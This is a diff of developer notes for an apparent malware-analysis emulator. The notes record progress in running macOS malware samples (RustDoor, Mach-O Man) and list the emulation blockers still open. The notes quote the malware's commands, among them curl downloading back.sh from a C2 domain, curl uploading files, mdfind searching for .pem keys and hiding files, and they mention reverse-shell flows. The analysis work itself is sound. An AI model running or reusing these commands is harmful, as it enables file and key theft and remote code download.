@@ -71,10 +71,11 @@ emulator behavior.
   - file writes to synthetic guest fds are now appended to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized_path>.bin`, configurable via `MACHINA_PAYLOAD_DUMP_DIR`, so analysts can inspect the actual payload bytes (e.g. the `~/.zshrc` injection) instead of just a 128-byte preview.
   - the immediate post-daemon blocker observed under the legacy 10M-instruction budget was `instruction_budget_exhausted` deep inside the parent's Rust `OnceLock`/init trampoline at the `cas64` → `blr` pattern around `0x100182424` / `0x10018242C`; with the SWP/`_exit`/`done_addr` fixes that path now completes well within the default profile
   - the worker-thread `brk #0x1` at `0x10000AE00` is no longer reachable: the panic was caused by `_fcntl(kq, F_DUPFD_CLOEXEC, _)` returning `-1` because `duplicate_synthetic_fd` only consults `process_fd_targets` and kqueue fds live in `os.kqueues`. The fcntl hook now detects kqueue fds, clones the kevent registration set into a fresh kqueue fd, and clamps the bogus stack-pointer-shaped min-fd argument that mio leaks through inlined helpers. After this, the worker bootstraps Tokio's macOS event loop the same way real Tokio does: `_kqueue` → 131072, `_fcntl(kq, F_SETFD, _)`, `_fcntl(kq, F_DUPFD_CLOEXEC, _)` → 131073, EVFILT_USER waker registration via `_kevent(ident=0, filter=-10, flags=EV_ADD|EV_CLEAR|EV_RECEIPT)`, `_fcntl(kq, F_DUPFD_CLOEXEC, 1)` → 131074.
-  - **current next blocker:** after the worker bootstraps its kqueue + EVFILT_USER waker, the daemon TID=3 reads 320 bytes from the log-stream pipe (the synthetic `restartInitiated` / `shutdownInitiated` log entries fed in by `posix_spawnp`), then both threads block waiting for further async events. The remaining instruction budget is consumed by the parent process spinning in a `OnceLock`/atomic-load loop at `0x100100728` (function `sub_1001006FC`, an `atomic_load_explicit(&qword_10026D408, memory_order_acquire) != 3` re-check). To reach the rest of Unit42's Table-1 commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) we need to drive the C2 command loop — either by handing the daemon a synthetic HTTP response, or by wiring the worker's EVFILT_USER waker so Tokio actually wakes up after the log-stream pipe data is delivered. Neither blocker is a bug in the emulator — they are missing C2 / async-runtime fixtures.
+  - synthetic kqueue now honors EV_RECEIPT registration acknowledgements and EVFILT_USER `NOTE_TRIGGER` wakeups. A triggered EVFILT_USER registration can be returned through the guest `eventlist`, and `EV_CLEAR` registrations reset after delivery; the pipe-read readiness path remains covered by the same helper logic.
+  - **current next blocker:** after the worker bootstraps its kqueue + EVFILT_USER waker, the daemon TID=3 reads 320 bytes from the log-stream pipe (the synthetic `restartInitiated` / `shutdownInitiated` log entries fed in by `posix_spawnp`), then both threads block waiting for further async events. The remaining instruction budget is consumed by the parent process spinning in a `OnceLock`/atomic-load loop at `0x100100728` (function `sub_1001006FC`, an `atomic_load_explicit(&qword_10026D408, memory_order_acquire) != 3` re-check). To reach the rest of Unit42's Table-1 commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) we still need to drive the C2 command loop or add a synthetic producer that actually triggers the registered user/event-loop wakeups after log-stream or network data is made available.
 - Important implication:
   - the in-process bootstrap/runtime/daemonization compatibility blockers are resolved and the emulator now reaches the first article-listed `posix_spawnp` command (`log stream --predicate ... restartInitiated/shutdownInitiated --info`)
-  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test
+  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test; the lower-level EVFILT_USER receipt/trigger state machine is covered by unit tests in `src/macos/arch_arm64/io_imports.rs`
   - the next compatibility work for this family is making Tokio's poll loop emit synthetic events for the C2 HTTP requests / log-stream pipe, so the malware progresses past its async wait and into the remaining `posix_spawnp` calls (chflags / chmod / curl / zip / mdfind / reverse-shell)
 - Recommended local invocation:
   - `MACHINA_PROFILE=long .\target\debug\machina.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`
@@ -126,22 +127,27 @@ emulator behavior.
     profiler's host inventory commands are visible at that OS-call
     boundary, including `uname`, `stat`, `sysctl`, `date`,
     `ifconfig`, and `ps`.
+  - analysis mode now gives `_popen` calls a synthetic `FILE*` stream
+    for common profiler inventory commands. `fgets`/`fread` consume
+    command-specific stdout fixtures (`Darwin`, `arm64`, boot time,
+    timezone, CPU brand, en0 MAC/IP, and a small process list with
+    Chrome), while `feof`/`ferror`/`clearerr` preserve normal FILE-loop
+    semantics. The Mach-O Man regression now asserts both the `_popen`
+    metadata and real guest `fgets` reads from that synthetic stdout.
   - Repeated `_sleep(1)` from the same caller is now treated as an
     idle daemon/profiler loop after three hits. The current
     validated run stops cleanly with
     `Detail=idle_sleep_loop(seconds=1, caller=0x100228950, sleeps=3)`
     instead of exhausting the instruction budget.
 - **Current next blocker:** the sample's profile collection is now
-  past bootstrap and into malware logic, but many command-derived
-  values are still empty because `_popen` does not yet synthesize
-  command-specific stdout. Browser extension `find ... Extensions`
-  commands are visible in the libc++ string-building trace, but the
-  OS-level `_popen` argument currently materializes as only the
-  trailing ` 2>/dev/null` suffix; the next useful compatibility work
-  is fixing the stack-side command handoff after string construction
-  plus richer `popen`/FILE output modeling and C2/upload fixtures so
-  the generated `post_body_*.txt` / `post_resp_*.txt` flow contains
-  realistic host data and server responses.
+  past bootstrap and into malware logic with realistic host-inventory
+  stdout, but browser extension `find ... Extensions` commands are
+  still visible in the libc++ string-building trace while the OS-level
+  `_popen` argument often materializes as only the trailing
+  ` 2>/dev/null` suffix. The next useful compatibility work is fixing
+  that stack-side command handoff after string construction, then
+  adding C2/upload fixtures so the generated `post_body_*.txt` /
+  `post_resp_*.txt` flow contains server responses.
 - **The obfuscated usage check** sits at
   `sub_1002280F4 + 0x34 (= 0x10022812C)`: a `tbz w0, #0,
   0x100228378` that consumes the return value of
